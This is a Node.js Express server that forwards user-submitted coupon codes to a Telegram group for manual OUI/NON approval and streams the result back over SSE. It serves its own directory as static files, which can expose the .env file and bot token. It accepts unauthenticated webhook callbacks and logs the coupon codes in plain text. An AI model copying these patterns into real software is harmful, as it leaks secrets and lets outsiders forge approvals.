require('dotenv').config();

const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 8080;

/* =========================
   DEBUG LOGGER
========================= */

function log(scope, message, data = null) {
    const time = new Date().toISOString();

    if (data) {
        console.log(`[${time}] [${scope}] ${message}`, data);
    } else {
        console.log(`[${time}] [${scope}] ${message}`);
    }
}

function error(scope, message, err = null) {
    const time = new Date().toISOString();

    if (err) {
        console.error(`[${time}] [${scope}] ${message}`, err);
    } else {
        console.error(`[${time}] [${scope}] ${message}`);
    }
}

/* =========================
   MEMORY STORE
========================= */

const codes = {};
const sseClients = {};

/* =========================
   MIDDLEWARE
========================= */

app.use(bodyParser.json({ limit: '5mb' }));
app.use(express.static(__dirname));

app.use((req, res, next) => {
    log(
        'HTTP',
        `${req.method} ${req.originalUrl} | IP=${req.ip}`
    );

    next();
});

/* =========================
   HEALTH CHECK
========================= */

app.get('/api/health', (req, res) => {
    log('HEALTH', 'Health check OK');

    res.json({
        ok: true,
        uptime: process.uptime(),
        memory: process.memoryUsage(),
        timestamp: Date.now()
    });
});

/* =========================
   SSE STREAM
========================= */

app.get('/api/stream/:requestId', (req, res) => {
    const { requestId } = req.params;

    log('SSE', `New SSE connection`, {
        requestId
    });

    res.set({
        'Content-Type': 'text/event-stream',
        'Cache-Control': 'no-cache',
        Connection: 'keep-alive'
    });

    res.flushHeaders();

    sseClients[requestId] = res;

    res.write(
        `data: ${JSON.stringify({
            status: 'connected',
            requestId
        })}\n\n`
    );

    req.on('close', () => {
        log('SSE', `Client disconnected`, {
            requestId
        });

        delete sseClients[requestId];
    });
});

/* =========================
   CREATE REQUEST
========================= */

app.post('/api/request', async (req, res) => {
    try {
        const { code, type, requestId } = req.body;

        log('REQUEST', 'Incoming request body', req.body);

        if (!code || !type || !requestId) {
            error('REQUEST', 'Missing parameters', req.body);

            return res.status(400).json({
                ok: false,
                error: 'Missing parameters'
            });
        }

        codes[requestId] = {
            code,
            type,
            status: 'pending',
            createdAt: Date.now()
        };

        log('REQUEST', 'Stored request in memory', {
            requestId,
            status: 'pending'
        });

        await sendCouponMessage(type, code, requestId);

        log('REQUEST', 'Telegram message sent', {
            requestId
        });

        return res.json({
            ok: true,
            requestId
        });

    } catch (err) {
        error('REQUEST', 'Unhandled request error', err);

        return res.status(500).json({
            ok: false,
            error: err.message
        });
    }
});

/* =========================
   STATUS
========================= */

app.get('/api/status/:requestId', (req, res) => {
    try {
        const { requestId } = req.params;

        log('STATUS', 'Checking status', {
            requestId
        });

        if (!codes[requestId]) {
            log('STATUS', 'Request not found', {
                requestId
            });

            return res.json({
                status: 'pending'
            });
        }

        log('STATUS', 'Returning status', {
            requestId,
            status: codes[requestId].status
        });

        return res.json({
            status: codes[requestId].status
        });

    } catch (err) {
        error('STATUS', 'Status endpoint error', err);

        return res.status(500).json({
            error: err.message
        });
    }
});

/* =========================
   TELEGRAM WEBHOOK
========================= */

app.post('/api/telegram', async (req, res) => {
    try {
        const body = req.body;

        log('TELEGRAM', 'Webhook received', body);

        if (!body.callback_query) {
            log('TELEGRAM', 'No callback_query found');

            return res.send('OK');
        }

        const callbackData = body.callback_query.data;

        log('TELEGRAM', 'Callback data received', {
            callbackData
        });

        const [action, requestId] = callbackData.split('|');

        if (!codes[requestId]) {
            error('TELEGRAM', 'Request ID not found', {
                requestId
            });

            return res.send('OK');
        }

        if (action === 'OUI') {
            codes[requestId].status = 'valid';

            log('TELEGRAM', 'Coupon validated', {
                requestId
            });

        } else if (action === 'NON') {
            codes[requestId].status = 'invalid';

            log('TELEGRAM', 'Coupon invalidated', {
                requestId
            });
        }

        if (sseClients[requestId]) {
            log('SSE', 'Sending SSE update', {
                requestId,
                status: codes[requestId].status
            });

            sseClients[requestId].write(
                `data: ${JSON.stringify({
                    status: codes[requestId].status
                })}\n\n`
            );

            sseClients[requestId].end();

            delete sseClients[requestId];
        }

        const answerResp = await fetch(
            `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/answerCallbackQuery`,
            {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    callback_query_id: body.callback_query.id
                })
            }
        );

        const answerData = await answerResp.json();

        log('TELEGRAM', 'answerCallbackQuery response', answerData);

        return res.send('OK');

    } catch (err) {
        error('TELEGRAM', 'Webhook error', err);

        return res.status(500).send('ERROR');
    }
});

/* =========================
   SEND TELEGRAM
========================= */

app.post('/api/sendTelegram', async (req, res) => {
    try {
        const { code, type, requestId } = req.body;

        log('SENDTELEGRAM', 'Incoming payload', req.body);

        if (!code || !type || !requestId) {
            error('SENDTELEGRAM', 'Missing parameters', req.body);

            return res.status(400).json({
                ok: false,
                error: 'Missing parameters'
            });
        }

        const text =
            `Coupon à vérifier :\n` +
            `Type : ${type}\n` +
            `Code : ${code}\n` +
            `ID : ${requestId}`;

        log('SENDTELEGRAM', 'Sending Telegram message');

        const telegramResp = await fetch(
            `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
            {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: process.env.GROUP_ID,
                    text
                })
            }
        );

        const data = await telegramResp.json();

        log('SENDTELEGRAM', 'Telegram API response', data);

        if (!data.ok) {
            error('SENDTELEGRAM', 'Telegram API returned error', data);

            return res.status(500).json({
                ok: false,
                error: data.description
            });
        }

        return res.json({
            ok: true
        });

    } catch (err) {
        error('SENDTELEGRAM', 'Unhandled exception', err);

        return res.status(500).json({
            ok: false,
            error: err.message
        });
    }
});

/* =========================
   TELEGRAM MESSAGE
========================= */

async function sendCouponMessage(type, code, requestId) {
    try {
        const text =
            `Coupon à vérifier :\n` +
            `Type : ${type}\n` +
            `Code : ${code}\n` +
            `ID : ${requestId}`;

        log('TELEGRAM', 'Preparing sendMessage request', {
            requestId
        });

        const response = await fetch(
            `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
            {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: process.env.GROUP_ID,
                    text,
                    reply_markup: {
                        inline_keyboard: [[
                            {
                                text: '✅ OUI',
                                callback_data: `OUI|${requestId}`
                            },
                            {
                                text: '❌ NON',
                                callback_data: `NON|${requestId}`
                            }
                        ]]
                    }
                })
            }
        );

        const data = await response.json();

        log('TELEGRAM', 'sendMessage response', data);

        return data;

    } catch (err) {
        error('TELEGRAM', 'sendCouponMessage failed', err);

        throw err;
    }
}

/* =========================
   WEBHOOK CONFIG
========================= */

async function setupWebhook() {
    try {
        if (!process.env.BASE_URL) {
            log('WEBHOOK', 'BASE_URL not configured');

            return;
        }

        const webhookUrl =
            `${process.env.BASE_URL}/api/telegram`;

        log('WEBHOOK', 'Setting Telegram webhook', {
            webhookUrl
        });

        const response = await fetch(
            `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/setWebhook`,
            {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    url: webhookUrl
                })
            }
        );

        const data = await response.json();

        log('WEBHOOK', 'Webhook response', data);

    } catch (err) {
        error('WEBHOOK', 'Webhook setup failed', err);
    }
}

/* =========================
   GLOBAL ERROR HANDLERS
========================= */

process.on('uncaughtException', err => {
    error('PROCESS', 'uncaughtException', err);
});

process.on('unhandledRejection', err => {
    error('PROCESS', 'unhandledRejection', err);
});

/* =========================
   SERVER START
========================= */

app.listen(PORT, async () => {
    log('SERVER', `Server started on port ${PORT}`);

    log('SERVER', 'Environment check', {
        PORT,
        BASE_URL: process.env.BASE_URL || 'NOT_SET',
        GROUP_ID: process.env.GROUP_ID ? 'SET' : 'NOT_SET',
        TELEGRAM_BOT_TOKEN: process.env.TELEGRAM_BOT_TOKEN
            ? 'SET'
            : 'NOT_SET'
    });

    await setupWebhook();
});